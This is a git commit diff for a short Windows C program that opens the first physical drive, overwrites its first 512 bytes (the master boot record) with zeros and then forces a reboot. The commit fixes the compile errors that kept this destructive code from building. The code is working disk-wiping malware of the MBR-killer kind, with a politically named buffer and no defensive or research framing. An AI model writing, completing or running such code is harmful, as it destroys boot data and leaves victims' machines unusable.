e850b20ec4aff9ab2151153802b0cdeb7b385db9
Slav XpXz <76703277+Slav-XpXz@users.noreply.github.com>
2023-04-30 21:15:24 -0400

    improved

--- main.c
+++ main.c
@@ -2,14 +2,16 @@
 #include <windows.h>
 #include <stdlib.h>
 
-int main(int argc, char *argv[]){
+#define BUFF_SIZE 512
+
+int main(){
   DWORD wrote;
-  HANDLE mbr = createFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+  HANDLE mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 
   const char biden[BUFF_SIZE];
-  zeroMemory(biden, BUFF_SIZE);
+  ZeroMemory(biden, BUFF_SIZE);
   
-  if(WriteFile(mbr, biden, BUFF_SIZE, &wrote, NULL){
+  if(WriteFile(mbr, biden, BUFF_SIZE, &wrote, NULL)){
       system("shutdown /r");
   }
 
